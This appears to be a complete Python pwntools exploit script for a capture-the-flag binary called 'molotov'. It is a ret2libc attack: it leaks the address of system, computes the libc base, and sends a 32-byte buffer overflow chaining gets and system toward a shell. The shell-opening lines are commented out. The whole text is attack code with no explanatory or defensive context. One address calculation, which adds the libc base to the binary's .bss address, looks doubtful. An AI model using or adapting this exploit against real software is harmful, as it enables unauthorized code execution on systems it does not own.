from pwn import *

elf = ELF('./molotov', checksec = False)
libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec = False)
p = process('./molotov')
payload = 'A'*32
a = p.recv()
print a
libc.address = int(a.split()[0], 16)-libc.sym['system']
payload+=p32(libc.sym['gets'])+p32(libc.sym['system'])+p32(libc.address+elf.bss())+p32(libc.address+elf.bss())
pause()
p.sendline(payload)
print p.recv()
#p.send('/bin/sh\0')
#p.interactive()
